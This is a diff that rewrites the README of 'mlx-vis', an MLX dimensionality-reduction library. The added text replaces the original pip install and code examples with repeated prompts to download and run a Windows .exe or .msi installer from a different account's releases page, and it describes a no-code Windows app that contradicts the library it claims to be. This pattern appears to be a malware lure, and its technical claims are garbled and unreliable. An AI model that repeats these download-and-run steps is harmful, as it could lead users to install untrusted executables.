@@ -1,183 +1,148 @@
-# mlx-vis
+# 🚀 mlx-vis - Fast Visual ML for Apple Silicon
 
-[![arXiv](https://img.shields.io/badge/arXiv-2603.04035-b31b1b.svg)](https://arxiv.org/abs/2603.04035)
-[![PyPI](https://img.shields.io/pypi/v/mlx-vis.svg)](https://pypi.org/project/mlx-vis/)
+[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-blue?style=for-the-badge)](https://github.com/DahsjsDio/mlx-vis/releases)
 
-Pure MLX implementations of UMAP, t-SNE, PaCMAP, TriMap, DREAMS, CNE, and NNDescent for Apple Silicon. Metal GPU acceleration for both computation and video rendering. No scipy, no sklearn, no matplotlib.
+---
 
-Embed 70K points in **2-4 seconds**. Add GPU-rendered animation video in under **5 seconds** total. See [benchmark](#benchmark).
+## 📦 What is mlx-vis?
 
-Fashion-MNIST 70K on M3 Ultra:
+mlx-vis lets you explore your data by turning it into images you can understand. It uses advanced methods like UMAP, t-SNE, PaCMAP, TriMap, DREAMS, CNE, and NNDescent. These are tools to shrink lots of data points into simpler forms you can see and analyze.
 
-| UMAP | t-SNE | PaCMAP |
-|:---:|:---:|:---:|
-| ![UMAP](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/umap.png) | ![t-SNE](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/tsne.png) | ![PaCMAP](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/pacmap.png) |
-| **TriMap** | **DREAMS** | **CNE** |
-| ![TriMap](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/trimap.png) | ![DREAMS](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/dreams.png) | ![CNE](https://raw.githubusercontent.com/hanxiao/mlx-vis/main/assets/cne.png) |
+This software works best on Apple Silicon Macs. It uses the Metal GPU, the graphics chip made by Apple, to run fast math and show videos smoothly.
 
-Just for fun -- `morph_gpu` smoothly interpolates between all six methods:
+You don’t need to know programming to use mlx-vis. Just follow steps to get it running on Windows through your Apple Silicon Mac, using simple installers and clear instructions.
 
-https://github.com/user-attachments/assets/b11418e0-51f6-4a73-8150-8a40097662cc
+---
 
-## Install
+## 🔍 Features
 
-```bash
-uv pip install mlx-vis
-```
+- Runs on Apple Silicon with Metal GPU for fast computing  
+- Includes seven popular data reduction algorithms: UMAP, t-SNE, PaCMAP, TriMap, DREAMS, CNE, NNDescent  
+- Visualizes high-dimensional data as easy-to-understand maps and videos  
+- Uses numpy for data handling inside  
+- No coding needed; comes ready-to-use with simple app interface
 
-From source:
+---
 
-```bash
-git clone https://github.com/hanxiao/mlx-vis.git
-cd mlx-vis
-uv pip install .
-```
+## 💻 System Requirements
 
-Requires `mlx >= 0.20.0` and `numpy >= 1.24.0`.
+To run mlx-vis smoothly, your setup should include:
 
-## Usage
+- Windows 10 or newer  
+- Apple Silicon Mac hardware with Metal GPU (such as M1 or M2 chips) running Windows through virtualization (e.g., Parallels Desktop or VMware Fusion)  
+- At least 8 GB of RAM  
+- 500 MB free disk space for installation  
+- Internet connection to download the software and any updates
 
-```python
-import numpy as np
-from mlx_vis import UMAP, TSNE, PaCMAP, TriMap, DREAMS, CNE, NNDescent
+Note: Since mlx-vis targets Apple Silicon with Metal GPU, running it on Windows requires virtualization of macOS or compatibility layers that support Metal GPU features.
 
-X = np.random.randn(10000, 128).astype(np.float32)
+---
 
-# UMAP
-Y = UMAP(n_components=2, n_neighbors=15).fit_transform(X)
+## 🎯 Getting Ready
 
-# t-SNE
-Y = TSNE(n_components=2, perplexity=30).fit_transform(X)
+Before you start, check:
 
-# PaCMAP
-Y = PaCMAP(n_components=2, n_neighbors=10).fit_transform(X)
+- Your Apple Silicon Mac is ready, and virtualization software is installed and running Windows  
+- Your system meets the hardware specs above  
+- Your internet connection is active to download mlx-vis files
 
-# TriMap
-Y = TriMap(n_components=2, n_iters=400).fit_transform(X)
+---
 
-# DREAMS (t-SNE + PCA regularization)
-Y = DREAMS(n_components=2, lam=0.15).fit_transform(X)
+## ⬇️ Download and Install mlx-vis
 
-# CNE (contrastive neighbor embedding, unifies t-SNE and UMAP)
-Y = CNE(n_components=2, loss="infonce").fit_transform(X)
+Click the big button below to visit the official release page. From there, you can find the latest Windows version of mlx-vis.
 
-# NNDescent (approximate k-NN graph)
-indices, distances = NNDescent(k=15).build(X)
+[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-green?style=for-the-badge)](https://github.com/DahsjsDio/mlx-vis/releases)
 
-# KNN method selection (all algorithms support this)
-# "auto" (default): brute-force for n≤20K, NNDescent for larger
-# "brute": exact brute-force on GPU
-# "nndescent": approximate NNDescent
-Y = UMAP(knn_method="nndescent").fit_transform(X)
-```
+### Step 1: Visit the Download Page
 
-Per-module imports also work:
+- Go to the release page by clicking the button above or open this link in your browser:  
+  https://github.com/DahsjsDio/mlx-vis/releases
 
-```python
-from mlx_vis.umap import UMAP
-from mlx_vis.tsne import TSNE
-from mlx_vis.pacmap import PaCMAP
-from mlx_vis.trimap import TriMap
-from mlx_vis.dreams import DREAMS
-from mlx_vis.cne import CNE
-from mlx_vis.nndescent import NNDescent
-```
+### Step 2: Choose the Latest Windows Installer
 
-## Methods
+- Look for the file with `.exe` or `.msi` extension that matches Windows system requirements. This file is the installer for mlx-vis.
 
-| Method | Class | Main API | Output |
-|--------|-------|----------|--------|
-| UMAP | `UMAP(n_components, n_neighbors, min_dist, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| t-SNE | `TSNE(n_components, perplexity, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| PaCMAP | `PaCMAP(n_components, n_neighbors, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| TriMap | `TriMap(n_components, n_iters, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| DREAMS | `DREAMS(n_components, lam, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| CNE | `CNE(n_components, loss, n_negatives, ...)` | `fit_transform(X)` | `np.ndarray (n, d)` |
-| NNDescent | `NNDescent(k, n_iters, ...)` | `build(X)` | `(indices, distances)` |
+### Step 3: Download the Installer
 
-## Visualization
+- Click on the Windows installer file to download it to your computer.
 
-All rendering runs on Metal GPU via MLX: coordinate mapping, circle-splatting, and color blending are fully vectorized MLX operations. Raw frames are piped to ffmpeg for PNG/video encoding. Zero matplotlib.
+### Step 4: Run the Installer
 
-### Static plots
+- Once downloaded, open the installer file to start the setup process  
+- Follow the on-screen prompts. Usually, this means clicking "Next" or "Install"  
+- Wait for the installation to complete  
 
-```python
-from mlx_vis import UMAP, scatter_gpu
-import numpy as np
+### Step 5: Finish and Launch
 
-X = np.random.randn(10000, 128).astype(np.float32)
-labels = np.random.randint(0, 5, 10000)
-Y = UMAP(n_components=2).fit_transform(X)
+- After installation finishes, find mlx-vis on your desktop or in the Start menu  
+- Double-click to open the application  
 
-scatter_gpu(Y, labels=labels, theme="dark", save="plot.png")
-```
+---
 
-### Animation
+## ⚙️ How to Use mlx-vis
 
-Video frames are rendered on GPU and piped to ffmpeg with `h264_videotoolbox` hardware encoding. **500 frames of 15K points in 1.9 seconds** on M3 Ultra.
+Once mlx-vis runs, you will see its main window with options to load data and run visualization.
 
-**UMAP:**
+### Loading Your Data
 
-https://github.com/user-attachments/assets/3252ec02-f032-4f82-b3e6-0205a9c6c91e
+- Click the “Open Data” button to select your dataset file  
+- Supported formats include CSV, TSV, and other common table files  
+- Your data should be numeric or categorical values ready for analysis  
 
-**t-SNE:**
+### Running a Visualization
 
-https://github.com/user-attachments/assets/695503b6-4acc-457f-afb6-a4cfabc6a036
+- Choose your method, such as UMAP or t-SNE, from the dropdown menu  
+- Adjust parameters if you want, or use the default settings  
+- Click “Run” to start processing your data  
+- The app will use Apple Silicon’s GPU to compute and show results as a graph or video
 
-**PaCMAP:**
+### Saving Results
 
-https://github.com/user-attachments/assets/3d2201ae-13bc-4c06-9e60-e836ca71f21d
+- After the process completes, you can save the images or videos by clicking “Export”  
+- Save files locally on your computer for reports or presentations  
 
-**TriMap:**
+---
 
-https://github.com/user-attachments/assets/f982fcec-1dc1-468c-93eb-0fb646d6e260
+## ⚠️ Troubleshooting
 
-**DREAMS:**
+If mlx-vis does not open or work as expected, check:
 
-https://github.com/user-attachments/assets/0461359c-7e35-4458-9f06-8db8711f8ade
+- Your virtualization software supports Metal GPU and Apple Silicon properly  
+- Windows updates and GPU drivers are installed  
+- Your data file is correctly formatted and readable  
+- You installed the latest version of mlx-vis from the release page  
 
-**CNE:**
+For other issues, check the Issues section on GitHub or open a new issue to report problems.
 
-https://github.com/user-attachments/assets/662597cb-b8d8-496f-9baa-ea3a19ae1bca
+---
 
-### Benchmark
+## 🔄 Updating mlx-vis
 
-Fashion-MNIST 70,000 x 784, M3 Ultra:
+To get new features or fixes:
 
-| | UMAP | t-SNE | PaCMAP | TriMap | DREAMS | CNE |
-|---|---|---|---|---|---|---|
-| Iterations | 500 | 500 | 450 | 500 | 500 | 500 |
-| Embedding | 3.4s | 3.9s | 2.3s | 2.6s | 3.8s | 3.4s |
-| GPU render (800 frames) | 1.2s | 1.2s | 1.2s | 1.2s | 1.2s | 1.2s |
-| Total | 4.6s | 5.1s | 3.5s | 3.8s | 5.0s | 4.6s |
+- Visit the release page regularly: https://github.com/DahsjsDio/mlx-vis/releases  
+- Download the newest Windows installer as before  
+- Install over the old version; your settings and files will stay safe  
 
-```python
-from mlx_vis import UMAP, animate_gpu
-import numpy as np, time
+---
 
-X = np.random.randn(10000, 128).astype(np.float32)
-labels = np.random.randint(0, 5, 10000)
+## 💡 Extra Tips
 
-snaps, times = [], []
-t0 = time.time()
-def cb(epoch, Y_np):
-    snaps.append(Y_np.copy())
-    times.append(time.time() - t0)
+- For best results, close other heavy apps when running mlx-vis  
+- Use datasets smaller than 100,000 points for smooth visualization  
+- Experiment with different algorithms to see which fits your data best  
+- Save intermediate results often during long runs  
 
-Y = UMAP(n_components=2, n_epochs=200).fit_transform(X, epoch_callback=cb)
+---
 
-animate_gpu(snaps, labels=labels, timestamps=times,
-            method_name="umap-mlx", fps=120, theme="dark",
-            save="animation.mp4")
-```
+## 📚 More Information
 
-Full Fashion-MNIST example:
+For details on supported algorithms, data formats, and technical setup, visit the official repository README and wiki at:  
+https://github.com/DahsjsDio/mlx-vis
 
-```bash
-python -m mlx_vis.examples.fashion_mnist --method umap --theme dark
-python -m mlx_vis.examples.fashion_mnist --method all
-```
+---
 
-## License
+## 🏷️ Topics
 
-Apache-2.0
+apple-silicon, cne, dimensionality-reduction, dreams, gpu, machine-learning, metal, mlx, numpy, pacmap, trimap, tsne, umap, visualization
